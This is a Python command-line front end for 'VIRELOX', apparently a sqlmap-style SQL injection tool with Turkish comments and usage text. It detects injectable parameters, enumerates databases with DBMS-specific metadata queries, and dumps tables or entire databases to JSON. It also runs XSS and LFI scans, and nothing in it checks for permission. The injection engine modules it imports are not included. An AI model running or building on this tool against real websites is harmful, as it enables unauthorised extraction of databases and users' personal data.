#!/usr/bin/env python3
"""
VIRELOX v4.1 — Pentest SQL Injection & Web Güvenlik Tarayıcı
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Kullanım:
  python virelox.py -u "http://hedef.com/sayfa.php?id=1" --dump-all
  python virelox.py -u "http://hedef.com/sayfa.php?id=1" -p id --dbs
  python virelox.py -u "http://hedef.com/sayfa.php?id=1" -p id --tables
  python virelox.py -u "http://hedef.com/sayfa.php?id=1" --data "id=1" --dump-all
  python virelox.py -u "http://hedef.com/sayfa.php?id=1" --scan-all

Mozilla Public License 2.0 — AltayHR Developers
"""

import sys
import os
import argparse
import json
import time
import urllib.parse
from datetime import datetime

# Proje kök dizinini Python path'e ekle (import'ların çalışması için)
_DIR = os.path.dirname(os.path.abspath(__file__))
if _DIR not in sys.path:
    sys.path.insert(0, _DIR)

# ── Renkli loglama ────────────────────────────────────────────────────────────
try:
    from yonetim_sistemi.log_tema import (
        log_basari, log_hata, log_bilgi, log_uyari, log_baslik,
        log_separator, log_payload, log_dump, log_tablo, log_veri,
        log_dbms, log_hedef, log_sqli, log_waf, log_profil,
        log_bulundu, log_bulunamadi, log_ozet_rapor,
    )
except ImportError:
    # Fallback: renkler olmadan düz print
    def _mk(tag):
        return lambda m: print(f"[{tag}] {m}")
    log_basari   = _mk("OK")
    log_hata     = _mk("ERROR")
    log_bilgi    = _mk("INFO")
    log_uyari    = _mk("WARNING")
    log_baslik   = _mk("=====")
    log_separator= lambda e="": print("─" * 60)
    log_payload  = _mk("PAYLOAD")
    log_dump     = _mk("DUMP")
    log_tablo    = _mk("TABLE")
    log_veri     = _mk("DATA")
    log_dbms     = _mk("DBMS")
    log_hedef    = _mk("TARGET")
    log_sqli     = _mk("SQLI")
    log_waf      = _mk("WAF")
    log_profil   = _mk("PROFILE")
    log_bulundu  = _mk("FOUND")
    log_bulunamadi = _mk("NOT-FOUND")
    log_ozet_rapor = lambda d: None


# ── Banner ────────────────────────────────────────────────────────────────────
BANNER = r"""
 ██╗   ██╗██╗██████╗ ███████╗██╗      ██████╗ ██╗  ██╗
 ██║   ██║██║██╔══██╗██╔════╝██║     ██╔═══██╗╚██╗██╔╝
 ██║   ██║██║██████╔╝█████╗  ██║     ██║   ██║ ╚███╔╝
 ╚██╗ ██╔╝██║██╔══██╗██╔══╝  ██║     ██║   ██║ ██╔██╗
  ╚████╔╝ ██║██║  ██║███████╗███████╗╚██████╔╝██╔╝ ██╗
   ╚═══╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
  v4.1 — SQL Injection & Web Güvenlik Tarayıcı | AltayHR
"""


def _banner():
    try:
        from colorama import Fore, Style, init
        init(autoreset=True)
        print(Fore.CYAN + Style.BRIGHT + BANNER + Style.RESET_ALL)
    except ImportError:
        print(BANNER)


# ── Argüman ayrıştırıcı ───────────────────────────────────────────────────────
def _argparse():
    p = argparse.ArgumentParser(
        prog="virelox",
        description="VIRELOX v4.1 — SQL Injection & Web Güvenlik Tarayıcı",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnekler:
  python virelox.py -u "http://site.com/page.php?id=1" --dump-all
  python virelox.py -u "http://site.com/page.php?id=1" -p id --dbs
  python virelox.py -u "http://site.com/page.php?id=1" -p id --tables
  python virelox.py -u "http://site.com/login.php" --data "user=a&pass=b" -p user --dump-all
  python virelox.py -u "http://site.com/page.php?id=1" --technique UNION --dump-all
  python virelox.py -u "http://site.com/page.php?id=1" --scan-all --verbose
        """,
    )

    # Hedef
    grp_hedef = p.add_argument_group("Hedef")
    grp_hedef.add_argument("-u", "--url",   required=True, metavar="URL",
                           help="Hedef URL (örn: http://site.com/page.php?id=1)")
    grp_hedef.add_argument("-p", "--param", metavar="PARAM",
                           help="Test edilecek parametre adı (boşsa URL'den otomatik alınır)")
    grp_hedef.add_argument("--data",        metavar="DATA",
                           help="POST verisi (örn: id=1&name=test)")
    grp_hedef.add_argument("--cookie",      metavar="COOKIE",
                           help="Cookie string (örn: session=abc123)")
    grp_hedef.add_argument("--header",      metavar="HEADER", action="append",
                           help="Ekstra HTTP başlığı (tekrarlanabilir: --header 'X-Foo: bar')")

    # Bağlantı
    grp_bag = p.add_argument_group("Bağlantı")
    grp_bag.add_argument("--proxy",   metavar="PROXY",
                         help="Proxy URL (örn: http://127.0.0.1:8080)")
    grp_bag.add_argument("--timeout", type=float, default=15.0, metavar="SEK",
                         help="İstek zaman aşımı saniye cinsinden (varsayılan: 15)")
    grp_bag.add_argument("--delay",   type=float, default=0.0, metavar="SEK",
                         help="Her istek arasında bekleme süresi (varsayılan: 0)")
    grp_bag.add_argument("--retries", type=int, default=3, metavar="N",
                         help="Başarısız istek tekrar sayısı (varsayılan: 3)")

    # Injection
    grp_inj = p.add_argument_group("Injection")
    grp_inj.add_argument("--technique", metavar="TEKNIK",
                         help="Kullanılacak teknik: ERROR, UNION, BOOLEAN, TIME, STACKED "
                              "(virgülle ayır: ERROR,UNION)")
    grp_inj.add_argument("--level",  type=int, default=1, choices=[1,2,3],
                         help="Tarama derinliği 1-3 (1=hızlı, 3=kapsamlı; varsayılan: 1)")
    grp_inj.add_argument("--dbms",   metavar="DBMS",
                         help="Zorla DBMS seç: MySQL, PostgreSQL, MSSQL, Oracle, SQLite")
    grp_inj.add_argument("--no-sniper", action="store_true",
                         help="Sniper (hedef profilleme) modunu kapat")
    grp_inj.add_argument("--threads", type=int, default=4, metavar="N",
                         help="Paralel dump için thread sayısı (varsayılan: 4)")

    # Eylemler
    grp_eylem = p.add_argument_group("Eylemler")
    grp_eylem.add_argument("--dbs",       action="store_true",
                            help="Mevcut veritabanlarını listele")
    grp_eylem.add_argument("--tables",    action="store_true",
                            help="Tabloları listele")
    grp_eylem.add_argument("--columns",   metavar="TABLO",
                            help="Belirtilen tablonun kolonlarını listele")
    grp_eylem.add_argument("--dump",      metavar="TABLO",
                            help="Belirtilen tabloyu dump et")
    grp_eylem.add_argument("--dump-all",  action="store_true",
                            help="Tüm veritabanını dump et")
    grp_eylem.add_argument("--scan-all",  action="store_true",
                            help="Tüm injection tiplerini tara")
    grp_eylem.add_argument("--xss",       action="store_true",
                            help="XSS tara")
    grp_eylem.add_argument("--lfi",       action="store_true",
                            help="LFI tara")

    # Çıktı
    grp_cikti = p.add_argument_group("Çıktı")
    grp_cikti.add_argument("-v", "--verbose", action="store_true",
                            help="Ayrıntılı çıktı (her payload göster)")
    grp_cikti.add_argument("-o", "--output",  metavar="DOSYA",
                            help="Sonuçları JSON dosyasına kaydet")
    grp_cikti.add_argument("--no-banner",     action="store_true",
                            help="Banner gösterme")

    return p.parse_args()


# ── Parametre otomatik tespiti ────────────────────────────────────────────────
def _param_tespit(url: str, post_data: str = None) -> list:
    """URL veya POST'taki parametreleri döndür."""
    params = []
    try:
        qs = urllib.parse.urlparse(url).query
        params += [k for k, _ in urllib.parse.parse_qsl(qs)]
    except Exception:
        pass
    if post_data:
        try:
            params += [k for k, _ in urllib.parse.parse_qsl(post_data)]
        except Exception:
            pass
    return params


# ── Cookie ayrıştırıcı ────────────────────────────────────────────────────────
def _cookie_parse(cookie_str: str) -> dict:
    if not cookie_str:
        return {}
    ck = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            ck[k.strip()] = v.strip()
        elif part:
            ck[part] = ""
    return ck


# ── Header ayrıştırıcı ────────────────────────────────────────────────────────
def _header_parse(header_list: list) -> dict:
    if not header_list:
        return {}
    hdrs = {}
    for h in header_list:
        if ":" in h:
            k, v = h.split(":", 1)
            hdrs[k.strip()] = v.strip()
    return hdrs


# ── Veri tablo çıktısı ────────────────────────────────────────────────────────
def _tablo_yazdir(tablo_adi: str, kolonlar: list, veriler: list):
    """SQLMap tarzı ASCII tablo çıktısı."""
    if not kolonlar:
        log_uyari(f"{tablo_adi}: kolon bilgisi yok")
        return
    log_separator(f"TABLO: {tablo_adi}")
    log_tablo(f"Kolon sayısı: {len(kolonlar)}  |  Satır sayısı: {len(veriler)}")
    # Başlık
    baslik = " | ".join(f"{k:<18}" for k in kolonlar[:8])
    print(f"  {baslik}")
    print("  " + "-" * min(len(baslik), 120))
    # Veriler
    for i, satir in enumerate(veriler[:50]):
        satir_str = " | ".join(
            f"{str(satir.get(k, ''))[:18]:<18}" for k in kolonlar[:8]
        )
        log_veri(satir_str)
    if len(veriler) > 50:
        log_bilgi(f"  ... {len(veriler) - 50} satır daha (dosyaya kaydedildi)")
    log_separator()


# ── Dump kaydet ───────────────────────────────────────────────────────────────
def _dump_kaydet(dump: dict, dosya: str):
    try:
        with open(dosya, "w", encoding="utf-8") as f:
            json.dump(dump, f, ensure_ascii=False, indent=2, default=str)
        log_basari(f"Dump kaydedildi: {dosya}")
    except OSError as e:
        log_hata(f"Kayıt hatası: {e}")


# ── Ana tarama motoru ─────────────────────────────────────────────────────────
class VIRELOXTarama:

    def __init__(self, args):
        self.args    = args
        self.verbose = args.verbose
        self.url     = self._url_normalize(args.url)
        self.param   = args.param
        self.post_data = self._post_hazirla(args.data)
        self._baslangic = time.time()
        self._sonuclar  = {
            "hedef":    self.url,
            "param":    self.param,
            "zaman":    datetime.now().isoformat(),
            "dbms":     None,
            "acik_tip": None,
            "tablolar": [],
            "dump":     {},
        }

        # ── HTTP istemci ──────────────────────────────────────────────────────
        from modüller.virelox_http_client import VIRELOXHttpIstemci
        ck = _cookie_parse(args.cookie)
        hdrs = _header_parse(args.header)
        gecikmeli = args.delay > 0
        self.http = VIRELOXHttpIstemci(
            timeout       = args.timeout,
            proxy         = args.proxy,
            cookies       = ck or None,
            headers       = hdrs or None,
            max_retry     = args.retries,
            gecikmeli     = gecikmeli,
            gecikme_aralik= (args.delay, args.delay + 0.5) if gecikmeli else (0, 0),
            log_func      = self._log,
        )

        # ── SQL motoru ────────────────────────────────────────────────────────
        from modüller.virelox_sql import SQLInjectionMotoru
        self.sql = SQLInjectionMotoru(
            self.http,
            log_func=self._log,
            payload_log_func=self._plog,
        )

        # Tarama derinliği (1=hızlı, 2=normal, 3=kapsamlı)
        self.sql._level = args.level

        # DBMS zorla
        if args.dbms:
            self.sql.tespit_dbms = args.dbms
            log_bilgi(f"DBMS zorla ayarlandı: {args.dbms}")

        # ── Injection Motor (scan-all için) ───────────────────────────────────
        sniper = not args.no_sniper
        from modüller.virelox_injection_motor import InjectionMotor
        self.motor = InjectionMotor(
            self.http,
            log_func=self._log,
            payload_log_func=self._plog,
            sniper_mod=sniper,
            max_workers=args.threads,
        )

    @staticmethod
    def _url_normalize(url: str) -> str:
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url

    @staticmethod
    def _post_hazirla(data_str: str):
        if not data_str:
            return None
        try:
            return dict(urllib.parse.parse_qsl(data_str, keep_blank_values=True))
        except Exception:
            return data_str

    def _log(self, mesaj: str):
        if self.verbose or any(tag in str(mesaj) for tag in
                               ("[FOUND]", "[OK]", "[DUMP]", "[TABLE]",
                                "[DBMS]", "[WAF]", "✔", "═══")):
            log_bilgi(mesaj)
        elif self.verbose:
            print(f"  {mesaj}")

    def _plog(self, mesaj: str):
        if self.verbose:
            log_payload(mesaj)

    def _param_sec(self) -> str:
        """Parametre belirtilmemişse URL/POST'tan otomatik al."""
        if self.param:
            return self.param
        params = _param_tespit(self.url, self.args.data)
        if params:
            self.param = params[0]
            log_bilgi(f"Otomatik parametre seçildi: '{self.param}'")
            return self.param
        log_hata("Parametre bulunamadı! -p ile belirtin veya URL'ye ?param=deger ekleyin.")
        sys.exit(1)

    def _teknik_listesi(self) -> list:
        """--technique argümanını parse et."""
        if not self.args.technique:
            return ["error", "union", "boolean", "time"]
        teknik_map = {
            "ERROR":   "error",
            "UNION":   "union",
            "BOOLEAN": "boolean",
            "BLIND":   "boolean",
            "TIME":    "time",
            "STACKED": "stacked",
        }
        return [teknik_map.get(t.strip().upper(), t.strip().lower())
                for t in self.args.technique.split(",")]

    # ── Enjeksiyon tespiti ────────────────────────────────────────────────────
    def _sqli_tespit(self, param: str) -> dict:
        """SQL injection açığını tespit et ve ilk çalışan tekniği döndür."""
        teknikler = self._teknik_listesi()
        log_bilgi(f"SQL injection taraması başlıyor: param='{param}' | teknikler={teknikler}")
        log_separator("INJECTION DETECTION")

        acik_tip  = None
        acik_payload = None

        metod_map = {
            "error":   self.sql.hata_tabanli_test,
            "union":   self.sql.union_tabanli_test,
            "boolean": self.sql.boolean_blind_test,
            "time":    self.sql.time_based_test,
            "stacked": self.sql.stacked_test,
        }

        for tip in teknikler:
            metod = metod_map.get(tip)
            if not metod:
                continue
            log_bilgi(f"Teknik deneniyor: {tip.upper()}")
            try:
                sonuc = metod(self.url, param, post_data=self.post_data)
                if sonuc.get("basarili"):
                    acik_tip    = tip.upper()
                    acik_payload = sonuc.get("payload", "")
                    dbms_bul    = sonuc.get("dbms") or self.sql.tespit_dbms or "?"
                    log_sqli(f"✔ {tip.upper()} AÇIK! payload={acik_payload[:60]}  DBMS={dbms_bul}")
                    log_basari(f"SQL injection bulundu: {tip.upper()}")
                    self._sonuclar["acik_tip"] = acik_tip
                    self._sonuclar["dbms"]     = dbms_bul

                    # Kolon bilgisini UNION'dan al (dump için gerekli)
                    if tip == "union":
                        k = sonuc.get("kolon_sayisi")
                        m = sonuc.get("metin_kolonu")
                        pf = sonuc.get("prefix", "-1")
                        ym = sonuc.get("yorum", "-- -")
                        if k is not None and m is not None:
                            self.sql.kolon_bilgisi_yukle(k, m, pf, ym)

                    return {"basarili": True, "tip": tip, "payload": acik_payload,
                            "dbms": dbms_bul}
                else:
                    log_bulunamadi(f"{tip.upper()} — açık değil")
            except KeyboardInterrupt:
                raise
            except Exception as e:
                log_uyari(f"{tip.upper()} hatası: {e}")

        log_bulunamadi("Hiçbir SQL injection açığı bulunamadı.")
        return {"basarili": False}

    # ── DB keşfi ──────────────────────────────────────────────────────────────
    def _db_al(self, param: str) -> str:
        log_bilgi("Aktif veritabanı sorgulanıyor...")
        db = self.sql.mevcut_veritabani_al(self.url, param, post_data=self.post_data)
        if db:
            log_dbms(f"Aktif veritabanı: {db}")
            self._sonuclar["aktif_db"] = db
        else:
            log_uyari("Aktif veritabanı alınamadı, 'main' varsayılıyor")
            db = "main"
        return db

    def _dbms_al(self) -> str:
        return self.sql.tespit_dbms or "MySQL"

    def _tablolari_al(self, param: str, db: str) -> list:
        log_bilgi(f"Tablolar alınıyor (DB={db})...")
        tablolar = self.sql.tablolari_al(self.url, param, db,
                                         post_data=self.post_data)
        if tablolar:
            log_tablo(f"{len(tablolar)} tablo bulundu: {', '.join(tablolar[:10])}"
                      + (" ..." if len(tablolar) > 10 else ""))
            self._sonuclar["tablolar"] = tablolar
        else:
            log_bulunamadi("Tablo bulunamadı.")
        return tablolar

    def _kolonlari_al(self, param: str, tablo: str, db: str) -> list:
        log_bilgi(f"Kolonlar alınıyor: {tablo}")
        kolonlar = self.sql.kolonlari_al(self.url, param, tablo, db,
                                          post_data=self.post_data)
        if kolonlar:
            log_tablo(f"{tablo} kolonları: {', '.join(kolonlar)}")
        else:
            log_bulunamadi(f"{tablo}: kolon bulunamadı")
        return kolonlar

    # ── XSS / LFI ─────────────────────────────────────────────────────────────
    def _xss_tara(self, param: str):
        from modüller.virelox_scanner import XSSTarayici
        log_baslik("XSS TARAMASI")
        xss = XSSTarayici(self.http, log_func=self._log)
        bulgular = xss.tara(self.url, param)
        if bulgular:
            log_bulundu(f"XSS AÇIĞI BULUNDU: {param} parametresinde!")
            for b in bulgular:
                log_sqli(f"  Payload: {b.get('payload','')[:80]}")
        else:
            log_bulunamadi("XSS açığı bulunamadı.")
        return bulgular

    def _lfi_tara(self, param: str):
        from modüller.virelox_scanner import LFITarayici
        log_baslik("LFI TARAMASI")
        lfi = LFITarayici(self.http, log_func=self._log)
        bulgular = lfi.tara(self.url, param)
        if bulgular:
            log_bulundu(f"LFI AÇIĞI BULUNDU: {param} parametresinde!")
            for b in bulgular:
                log_sqli(f"  Payload: {b.get('payload','')[:80]}")
        else:
            log_bulunamadi("LFI açığı bulunamadı.")
        return bulgular

    # ── Ana çalıştırma ────────────────────────────────────────────────────────
    def calistir(self):
        args   = self.args
        param  = self._param_sec()
        self.param = param

        log_hedef(f"Hedef: {self.url}  |  Param: {param}"
                  + (f"  |  POST: {args.data[:40]}..." if args.data else ""))

        # ── Hedef erişim kontrolü ─────────────────────────────────────────────
        log_bilgi("Hedef bağlantısı test ediliyor...")
        try:
            test_yanit = self.http.get(self.url)
            if test_yanit is None:
                log_hata("Hedefe bağlanılamadı! URL'i kontrol edin.")
                sys.exit(1)
            kod = getattr(test_yanit, "status_code", 0)
            log_bilgi(f"Hedef yanıt kodu: HTTP {kod}")
        except KeyboardInterrupt:
            raise
        except Exception as e:
            log_hata(f"Bağlantı hatası: {e}")
            sys.exit(1)

        # ── XSS/LFI isteğe bağlı tarama ──────────────────────────────────────
        if args.xss:
            self._xss_tara(param)
        if args.lfi:
            self._lfi_tara(param)

        # ── scan-all: tüm injection tiplerini InjectionMotor ile tara ─────────
        if args.scan_all:
            log_baslik("TAM INJECTION TARAMASI")
            sonuc = self.motor.tam_tara(self.url, param,
                                        post_data=self.post_data,
                                        mod="thorough")
            if sonuc.get("basarili"):
                log_basari(f"Açık tipler: {sonuc.get('basarililar')}")
            else:
                log_bulunamadi("Hiçbir injection açığı bulunamadı.")
            # Tek bir eylem için dön
            if not any([args.dbs, args.tables, args.columns,
                        args.dump, args.dump_all]):
                self._ozet(param)
                return

        # ── SQL injection tespiti ─────────────────────────────────────────────
        log_baslik("SQL INJECTION TESPİTİ")
        tespit = self._sqli_tespit(param)

        if not tespit.get("basarili"):
            # XSS/LFI varsa yine de özet yaz
            self._ozet(param)
            return

        acik_tip = tespit["tip"]

        # ── DBMS ──────────────────────────────────────────────────────────────
        dbms = self.sql.tespit_dbms or "MySQL"
        log_dbms(f"DBMS: {dbms}")

        # ── Aktif DB ──────────────────────────────────────────────────────────
        hedef_db = self._db_al(param)

        # ── --dbs: veritabanı listesi ─────────────────────────────────────────
        if args.dbs:
            log_baslik("VERİTABANLARI")
            # Strateji: GROUP_CONCAT tek sorguda tüm listeyi döndürür ama
            # uzun sonuçlarda UNION marker'ı kaybolabiliyor.
            # Güvenli yol: LIMIT 1 OFFSET n ile birer birer çek.
            # Her iterasyonda kısa bir string (tek DB adı) döner — UNION ile güvenilir çalışır.
            _db_offset_sorgular = {
                "MySQL":                "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {n}",
                "MariaDB":              "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {n}",
                "PostgreSQL":           "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY datname LIMIT 1 OFFSET {n}",
                "Microsoft SQL Server": "SELECT name FROM sys.databases ORDER BY name OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY",
                "Oracle":               "SELECT username FROM all_users ORDER BY username OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY",
                "SQLite":               "SELECT name FROM sqlite_master WHERE type='database' LIMIT 1 OFFSET {n}",
            }
            _db_sorgu_tpl = _db_offset_sorgular.get(
                dbms,
                "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {n}"
            )

            db_listesi = []
            for offset in range(30):    # max 30 veritabanı
                sorgu = _db_sorgu_tpl.format(n=offset)
                res = self.sql.union_sorgu_calistir(self.url, param, sorgu, post_data=self.post_data)
                if not res:
                    res = self.sql.hata_sorgu_calistir(self.url, param, sorgu, post_data=self.post_data)
                if not res:
                    break       # offset bu noktada satır yok → liste tamam
                res = res.strip()
                if res and res not in db_listesi:
                    db_listesi.append(res)
                else:
                    break       # tekrar aynı sonuç → tükendik

            if db_listesi:
                log_tablo(f"Veritabanları ({len(db_listesi)}): {', '.join(db_listesi)}")
            else:
                log_bulunamadi("Veritabanı listesi alınamadı.")

        # ── --tables: tablo listesi ───────────────────────────────────────────
        if args.tables:
            log_baslik("TABLOLAR")
            tablolar = self._tablolari_al(param, hedef_db)
            if tablolar:
                for t in tablolar:
                    log_tablo(f"  {t}")

        # ── --columns: kolon listesi ──────────────────────────────────────────
        if args.columns:
            log_baslik(f"KOLONLAR: {args.columns}")
            kolonlar = self._kolonlari_al(param, args.columns, hedef_db)
            if kolonlar:
                for k in kolonlar:
                    log_tablo(f"  {k}")

        # ── --dump: tek tablo dump ────────────────────────────────────────────
        if args.dump:
            log_baslik(f"TABLO DUMP: {args.dump}")
            kolonlar = self._kolonlari_al(param, args.dump, hedef_db)
            if kolonlar:
                veriler = self.sql.tablo_verisi_cek(
                    self.url, param, args.dump, kolonlar,
                    post_data=self.post_data)
                _tablo_yazdir(args.dump, kolonlar, veriler)
                self._sonuclar["dump"][args.dump] = {
                    "kolonlar": kolonlar,
                    "veriler": veriler,
                    "satir_sayisi": len(veriler),
                }
                log_basari(f"{args.dump}: {len(veriler)} satır dump edildi.")

        # ── --dump-all: tam dump ──────────────────────────────────────────────
        if args.dump_all:
            log_baslik("TAM VERİTABANI DUMP")
            log_bilgi(f"Paralel dump başlıyor (workers={args.threads})...")
            try:
                dump = self.sql.tam_veritabani_dump_async(
                    self.url, param,
                    hedef_db=hedef_db,
                    post_data=self.post_data,
                    log_func=log_dump,
                    max_workers=args.threads,
                )
                self._sonuclar["dump"] = dump

                tablo_say = len(dump.get("tablolar", {}))
                satir_say = sum(v.get("satir_sayisi", 0)
                                for v in dump.get("tablolar", {}).values())
                log_basari(f"Dump tamamlandı: {tablo_say} tablo, {satir_say} satır")

                # Tabloları ekrana yaz
                for tablo_adi, tablo_veri in dump.get("tablolar", {}).items():
                    _tablo_yazdir(
                        tablo_adi,
                        tablo_veri.get("kolonlar", []),
                        tablo_veri.get("veriler", []),
                    )
            except KeyboardInterrupt:
                log_uyari("Dump kullanıcı tarafından durduruldu (Ctrl+C)")

        self._ozet(param)

    # ── Özet rapor ────────────────────────────────────────────────────────────
    def _ozet(self, param: str):
        sure_sn = time.time() - self._baslangic
        sure_str = f"{int(sure_sn // 60)}:{int(sure_sn % 60):02d}"

        dump = self._sonuclar.get("dump", {})
        tablo_verisi = dump.get("tablolar", dump) if isinstance(dump, dict) else {}

        tablo_say = len(tablo_verisi)
        satir_say = sum(v.get("satir_sayisi", 0)
                        for v in tablo_verisi.values()
                        if isinstance(v, dict))
        kolon_say = sum(len(v.get("kolonlar", []))
                        for v in tablo_verisi.values()
                        if isinstance(v, dict))

        log_ozet_rapor({
            "url":      self.url,
            "dbms":     self._sonuclar.get("dbms") or self.sql.tespit_dbms or "?",
            "waf":      "Tespit edilmedi",
            "aciklar":  1 if self._sonuclar.get("acik_tip") else 0,
            "tablolar": tablo_say,
            "kolonlar": kolon_say,
            "satirlar": satir_say,
            "sure":     sure_str,
        })

        # Dosyaya kaydet
        if self.args.output:
            _dump_kaydet(self._sonuclar, self.args.output)
        elif tablo_say > 0:
            dosya = f"virelox_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            _dump_kaydet(self._sonuclar, dosya)


# ── Giriş noktası ─────────────────────────────────────────────────────────────
def main():
    args = _argparse()

    if not args.no_banner:
        _banner()

    # Hiçbir eylem seçilmemişse en azından --tables çalıştır
    herhangi_eylem = any([
        args.dbs, args.tables, args.columns, args.dump,
        args.dump_all, args.scan_all, args.xss, args.lfi,
    ])
    if not herhangi_eylem:
        log_bilgi("Eylem belirtilmedi — varsayılan olarak SQL injection tespiti + --tables çalıştırılıyor.")
        args.tables = True

    try:
        tarama = VIRELOXTarama(args)
        tarama.calistir()
    except KeyboardInterrupt:
        print()
        log_uyari("Kullanıcı tarafından durduruldu (Ctrl+C). Çıkılıyor...")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        log_hata(f"Beklenmeyen hata: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
